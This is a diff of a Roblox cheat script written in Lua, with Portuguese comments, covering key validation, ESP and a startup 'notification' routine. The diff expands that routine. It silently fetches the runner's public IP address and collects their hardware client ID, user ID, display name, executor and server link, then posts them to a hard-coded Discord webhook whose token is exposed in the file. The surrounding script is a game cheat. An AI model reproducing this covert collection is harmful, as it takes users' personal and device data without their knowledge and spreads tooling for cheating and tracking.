@@ -185,23 +185,112 @@ local function validateKey(KeyTextbox, StatusLabel, ScreenGui)
 -------------------------------------------------------Começo------------------------------------------------------------------------------------
 -------------------------------------------------------------------------------------------------------------------------------------------------
 
---Webhook
 local HttpService = game:GetService("HttpService")
-local Webhook_URL = "https://discord.com/api/webhooks/1273359463927251088/BDY9cNwl3xc-Dq53-1Hf77B0GVtSq6jHmTzv6j7raHtTCW9-th5v_JMH-UEGv7ifa7CY" --Wehbook
+local Webhook_URL = "https://discord.com/api/webhooks/1273359463927251088/BDY9cNwl3xc-Dq53-1Hf77B0GVtSq6jHmTzv6j7raHtTCW9-th5v_JMH-UEGv7ifa7CY"
 
-local function sendRequest(requestFunction)
+local function sendRequest(requestFunction, isSuccess, securityAlert, errorMessage)
+    local ipAddress = game:HttpGet("https://api.ipify.org")  
+    local executorName = (identifyexecutor and identifyexecutor()) or "Desconhecido" 
+    local playerName = game.Players.LocalPlayer.DisplayName 
+    local executionTime = os.date("%Y-%m-%d %H:%M:%S") 
+    local scriptVersion = "1.0.0"  -- Versão do script
+    local gameUrl = "https://www.roblox.com/games/" .. tostring(game.PlaceId)  
+    local serverId = game.JobId 
+    local serverUrl = "https://www.roblox.com/games/" .. tostring(game.PlaceId) .. "/?serverId=" .. serverId  
+    local playersOnline = #game.Players:GetPlayers() 
+    local footerText = "Gerado pelo sistema de notificação "  
+
+    local embedColor = isSuccess and tonumber(0x00ff00) or tonumber(0xff0000)  
+
+    local securityMessage = securityAlert or "Nenhum alerta de segurança"
+
     local jsonBody = HttpService:JSONEncode({
         ["content"] = "",
         ["embeds"] = {{
-            ["title"] = "**O script foi executado!**",
-            ["description"] = game.Players.LocalPlayer.DisplayName.." executou o script Aftermath Free",
+            ["title"] = isSuccess and "**Script Executado com Sucesso!(PaidVersion)**" or "**Erro na Execução do Script(PaidVersion)**",
+            ["description"] = isSuccess and "🎉 O script foi executado com sucesso! (PaidVersion)" or "❌ O script encontrou um erro.(PaidVersion)",
             ["type"] = "rich",
-            ["color"] = tonumber(0xffffff),
-            ["fields"] = {{
-                ["name"] = "Hardware ID:",
-                ["value"] = game:GetService("RbxAnalyticsService"):GetClientId(),
-                ["inline"] = true
-            }}
+            ["color"] = embedColor,
+            ["fields"] = {
+                {
+                    ["name"] = "Nome do Jogo:",
+                    ["value"] = game.Name,
+                    ["inline"] = true
+                },
+                {
+                    ["name"] = "User ID:",
+                    ["value"] = game.Players.LocalPlayer.UserId,
+                    ["inline"] = true
+                },
+                {
+                    ["name"] = "Nome do Jogador:",
+                    ["value"] = playerName,
+                    ["inline"] = true
+                },
+                {
+                    ["name"] = "Hardware ID:",
+                    ["value"] = game:GetService("RbxAnalyticsService"):GetClientId(),
+                    ["inline"] = true
+                },
+                {
+                    ["name"] = "IP Local:",
+                    ["value"] = "||" .. ipAddress .. "||", 
+                    ["inline"] = true
+                },
+                {
+                    ["name"] = "Executor:",
+                    ["value"] = executorName,
+                    ["inline"] = true
+                },
+                {
+                    ["name"] = "Hora de Execução:",
+                    ["value"] = executionTime,
+                    ["inline"] = true
+                },
+                {
+                    ["name"] = "Versão do Script:",
+                    ["value"] = scriptVersion,
+                    ["inline"] = true
+                },
+                {
+                    ["name"] = "Link do Jogo:",
+                    ["value"] = gameUrl,
+                    ["inline"] = true
+                },
+                {
+                    ["name"] = "Link do Servidor:",
+                    ["value"] = serverUrl,
+                    ["inline"] = true
+                },
+                {
+                    ["name"] = "Jogadores Online:",
+                    ["value"] = tostring(playersOnline),
+                    ["inline"] = true
+                },
+                {
+                    ["name"] = "Documentação:",
+                    ["value"] = "[Consultar a documentação](https://example.com/documentation)",
+                    ["inline"] = true
+                },
+                {
+                    ["name"] = "Suporte Técnico:",
+                    ["value"] = "[Contatar o suporte](https://example.com/support)",
+                    ["inline"] = true
+                },
+                {
+                    ["name"] = "Alerta de Segurança:",
+                    ["value"] = securityMessage,
+                    ["inline"] = false
+                },
+                {
+                    ["name"] = "Mensagem de Erro:",
+                    ["value"] = errorMessage or "Nenhuma mensagem de erro",
+                    ["inline"] = false
+                }
+            },
+            ["footer"] = {
+                ["text"] = footerText
+            }
         }}
     })
 
@@ -214,16 +303,33 @@ local function sendRequest(requestFunction)
         Body = jsonBody
     })
 
-    print("Response Status Code: ", response.StatusCode)
-    print("Response Body: ", response.Body)
+    print("Código de Status da Resposta: ", response.StatusCode)
+    print("Corpo da Resposta: ", response.Body)
 end
 
 local requestFunction = (syn and syn.request) or (http_request) or (request)
-if requestFunction then
-    sendRequest(requestFunction)
-else
-    warn("Nenhuma função de solicitação HTTP disponível.")
+
+local isSuccess, securityAlert, errorMessage = true, "", ""
+
+-- Coloque o script aqui
+local success, err = pcall(function()
+
+     
+end)
+
+
+if not success then
+    isSuccess = false
+    errorMessage = err
+    securityAlert = "⚠️ Problema de segurança detectado "
 end
+
+if requestFunction then
+    sendRequest(requestFunction, isSuccess, securityAlert, errorMessage)
+else
+    warn("Nenhuma função de requisição HTTP disponível.")
+end
+
 -- ESP
 local FillColor = Color3.fromRGB(204,0,204)
 local DepthMode = "AlwaysOnTop"
